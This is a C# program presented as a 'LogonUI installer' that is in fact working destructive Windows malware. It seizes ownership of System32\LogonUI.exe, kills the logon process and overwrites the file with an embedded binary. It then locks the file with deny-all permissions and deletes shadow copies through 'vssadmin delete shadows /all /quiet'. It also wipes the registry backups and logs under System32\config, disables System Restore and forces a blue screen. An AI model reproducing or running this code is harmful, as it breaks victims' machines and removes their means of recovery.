// Installer.cs - Убиваем только LogonUI процесс
using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

namespace LogonUIInstaller
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetPriorityClass(IntPtr hProcess, uint dwPriorityClass);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetProcessDEPPolicy(IntPtr hProcess, uint dwFlags);

        [DllImport("ntdll.dll")]
        private static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);

        [DllImport("ntdll.dll")]
        private static extern uint NtRaiseHardError(
            uint errorStatus,
            uint numberOfParameters,
            IntPtr unicodeStringParameterMask,
            IntPtr parameters,
            uint validResponseOptions,
            out uint response
        );

        private const uint HIGH_PRIORITY_CLASS = 0x00000080;
        private const uint PROCESS_DEP_ENABLE = 0x00000001;

        static void Main(string[] args)
        {
            try
            {
                if (!IsAdministrator())
                {
                    RunAsAdministrator();
                    return;
                }

                SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
                SetProcessDEPPolicy(GetCurrentProcess(), PROCESS_DEP_ENABLE);

                string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
                string originalPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");

                SetFileOwnership(originalPath);
                SetFilePermissions(originalPath, FileSystemRights.FullControl);

                byte[] customLogonUI = ExtractResource("LogonUI.exe");

                KillLogonUIProcesses();

                if (File.Exists(originalPath))
                {
                    File.SetAttributes(originalPath, FileAttributes.Normal);
                    
                    for (int i = 0; i < 5; i++)
                    {
                        try
                        {
                            File.Delete(originalPath);
                            break;
                        }
                        catch
                        {
                            System.Threading.Thread.Sleep(1000);
                            try
                            {
                                File.Move(originalPath, originalPath + ".del");
                                File.Delete(originalPath + ".del");
                                break;
                            }
                            catch { }
                        }
                    }
                }

                File.WriteAllBytes(originalPath, customLogonUI);

                SetSystemProtection(originalPath);
                RemoveAllUserAccess(originalPath);
                DestroySystemBackups(originalPath);
                TriggerBSOD();

            }
            catch (Exception ex)
            {
                try
                {
                    using (var fs = new FileStream(@"C:\Windows\Temp\~tmp.log", FileMode.Create))
                    using (var sw = new StreamWriter(fs))
                    {
                        sw.Write(ex.ToString());
                    }
                }
                catch { }
                TriggerBSOD();
            }
        }

        private static bool IsAdministrator()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private static void RunAsAdministrator()
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = Assembly.GetEntryAssembly().Location;
            psi.UseShellExecute = true;
            psi.Verb = "runas";
            try
            {
                Process.Start(psi);
            }
            catch { }
            Environment.Exit(0);
        }

        private static void SetFileOwnership(string path)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                fileSecurity.SetOwner(WindowsIdentity.GetCurrent().User);
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch { }
        }

        private static void SetFilePermissions(string path, FileSystemRights rights)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                
                NTAccount account = new NTAccount(Environment.UserDomainName, Environment.UserName);
                FileSystemAccessRule rule = new FileSystemAccessRule(account, rights, AccessControlType.Allow);
                
                fileSecurity.AddAccessRule(rule);
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch { }
        }

        private static void SetSystemProtection(string path)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                
                NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
                FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
                    FileSystemRights.FullControl, AccessControlType.Allow);
                fileSecurity.AddAccessRule(systemRule);
                
                SecurityIdentifier everyone = new SecurityIdentifier(WellKnownSidType.WorldSid, null);
                FileSystemAccessRule denyRule = new FileSystemAccessRule(everyone, 
                    FileSystemRights.FullControl, AccessControlType.Deny);
                fileSecurity.AddAccessRule(denyRule);
                
                fileInfo.SetAccessControl(fileSecurity);
            }
            catch { }
        }

        private static void RemoveAllUserAccess(string path)
        {
            try
            {
                FileInfo fileInfo = new FileInfo(path);
                FileSecurity fileSecurity = fileInfo.GetAccessControl();
                
                AuthorizationRuleCollection rules = fileSecurity.GetAccessRules(true, true, typeof(NTAccount));
                foreach (FileSystemAccessRule rule in rules)
                {
                    if (rule.AccessControlType == AccessControlType.Allow)
                    {
                        if (!rule.IdentityReference.Value.Contains("SYSTEM") && 
                            !rule.IdentityReference.Value.Contains("TrustedInstaller"))
                        {
                            fileSecurity.RemoveAccessRule(rule);
                        }
                    }
                }
                
                fileInfo.SetAccessControl(fileSecurity);
                
                File.SetAttributes(path, FileAttributes.System | FileAttributes.ReadOnly | FileAttributes.Hidden);
            }
            catch { }
        }

        private static void DestroySystemBackups(string originalPath)
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "vssadmin.exe",
                    Arguments = "delete shadows /all /quiet",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

                string[] backupPaths = {
                    @"C:\Windows\System32\config\RegBack\*",
                    @"C:\Windows\System32\config\*.LOG*",
                    @"C:\Windows\System32\config\*.blf",
                    @"C:\Windows\System32\config\*.regtrans-ms",
                    @"C:\Windows\ServiceProfiles\LocalService\AppData\Local\FontCache\*",
                    @"C:\Windows\ServiceProfiles\NetworkService\AppData\Local\FontCache\*"
                };

                foreach (string path in backupPaths)
                {
                    try
                    {
                        if (path.Contains("*"))
                        {
                            string dir = Path.GetDirectoryName(path);
                            if (Directory.Exists(dir))
                            {
                                foreach (string file in Directory.GetFiles(dir, Path.GetFileName(path)))
                                {
                                    try { File.Delete(file); } catch { }
                                }
                            }
                        }
                        else if (File.Exists(path))
                        {
                            File.Delete(path);
                        }
                    }
                    catch { }
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = "reg.exe",
                    Arguments = "add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });

            }
            catch { }
        }

        private static void KillLogonUIProcesses()
        {
            try
            {
                Process[] logonProcesses = Process.GetProcessesByName("LogonUI");
                
                foreach (Process process in logonProcesses)
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(process.MainModule.FileName) && 
                            process.MainModule.FileName.Contains("System32"))
                        {
                            process.Kill();
                            process.WaitForExit(3000);
                            System.Threading.Thread.Sleep(500);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private static byte[] ExtractResource(string resourceName)
        {
            Assembly assembly = Assembly.GetExecutingAssembly();
            string fullName = $"LogonUIInstaller.{resourceName}";
            
            using (Stream stream = assembly.GetManifestResourceStream(fullName))
            {
                if (stream == null)
                    throw new Exception($"Ресурс {resourceName} не найден");
                    
                byte[] data = new byte[stream.Length];
                stream.Read(data, 0, data.Length);
                return data;
            }
        }

        private static void TriggerBSOD()
        {
            try
            {
                RtlAdjustPrivilege(19, true, false, out bool _);
                
                uint random = (uint)(DateTime.UtcNow.Ticks & 0xF_FFFF);
                uint bsodCode = 0xC000_0000 | ((random & 0xF00) << 8) | ((random & 0xF0) << 4) | (random & 0xF);
                
                NtRaiseHardError(bsodCode, 0, IntPtr.Zero, IntPtr.Zero, 6, out uint _);
            }
            catch { }
        }
    }
}
